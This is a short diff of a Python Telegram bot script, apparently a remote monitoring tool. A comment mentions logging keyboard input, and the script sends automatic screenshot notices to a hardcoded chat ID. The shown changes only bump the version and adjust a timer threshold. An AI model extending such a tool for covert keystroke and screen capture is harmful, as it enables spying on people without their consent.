@@ -1,5 +1,6 @@
 chat_user_id = 496266339
 ######################
+# new command !+time on auto scr
 #added russian keyboard to log
 #removed russian text from code and comments
 ######################
@@ -18,7 +19,7 @@ import win32gui
 from time import sleep
 #import ctypes
 #user32 = ctypes.windll.user32
-versi = '2.2'
+versi = '2.3'
 
 
 
@@ -152,7 +153,7 @@ def message_handler(update: Update, context: CallbackContext):
 		text=text[1:]
 		text = int(text)
 		if text < 5:
-			if timescreen > 5:
+			if timescreen > 1:
 				bot.send_message(chat_id=chat_user_id, text='Служба автоотправки остановлена!')
 				timescreen = 0
 			else:
